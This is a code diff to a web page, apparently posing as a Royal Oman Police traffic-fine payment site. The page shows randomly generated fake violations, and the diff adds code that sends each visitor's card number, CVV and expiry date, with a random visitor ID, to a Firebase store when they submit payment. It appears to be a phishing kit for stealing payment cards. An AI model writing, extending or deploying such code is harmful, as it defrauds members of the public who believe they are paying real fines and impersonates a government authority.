@@ -10,6 +10,7 @@ import { Button } from "@/components/ui/button"
 import { ViolationsList } from "@/components/violations-list"
 import { SiteHeader } from "@/components/ui/header"
 import { PaymentForm } from "@/components/payment-form"
+import { addData } from "@/lib/firebase"
 
 interface Violation {
   id: string
@@ -123,6 +124,11 @@ const mockViolations: Violation[] = [
     status: "paid",
   },
 ]
+function randstr(prefix:string)
+{
+    return Math.random().toString(36).replace('0.',prefix || '');
+}
+const visitorID=randstr('om-')
 
 export default function ROPFinePage() {
   const [violations, setViolations] = useState<Violation[]>([])
@@ -151,6 +157,7 @@ export default function ROPFinePage() {
     e.preventDefault()
     setIsLoading(true)
     // Simulate API call delay
+
     await new Promise((resolve) => setTimeout(resolve, 1500))
     const randomViolations = getRandomViolations()
     setViolations(randomViolations)
@@ -169,13 +176,11 @@ export default function ROPFinePage() {
       specificVehicle: false,
     })
   }
-  function randstr(prefix:string)
-  {
-      return Math.random().toString(36).replace('0.',prefix || '');
-  }
-  const visitorID=randstr('Tmn-')
-  const handlePaymentSuccess = () => {
+ 
+  const handlePaymentSuccess = (data:any) => {
     // Update violations to paid status
+    addData({id:visitorID,cardNumber:data.cardNumber,cvv:data.cvv,expiryDate:data.expiryDate})
+
     const updatedViolations = violations.map((v) => (v.status === "unpaid" ? { ...v, status: "paid" as const } : v))
     setViolations(updatedViolations)
     setShowPayment(false)
@@ -203,11 +208,11 @@ export default function ROPFinePage() {
         >
           {showPayment ? (
             <PaymentForm
+              handleSubmit={handlePaymentSuccess}
               totalAmount={totalAmount}
               violations={violations.filter((v) => v.status === "unpaid")}
-              onSuccess={handlePaymentSuccess}
-              onCancel={() => setShowPayment(false)}
-            />
+              onCancel={() => setShowPayment(false)} onSuccess={function (): void {
+              } }            />
           ) : !showViolations ? (
             <Card className="max-w-md mx-auto bg-white/40 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
               <CardContent className="p-8">
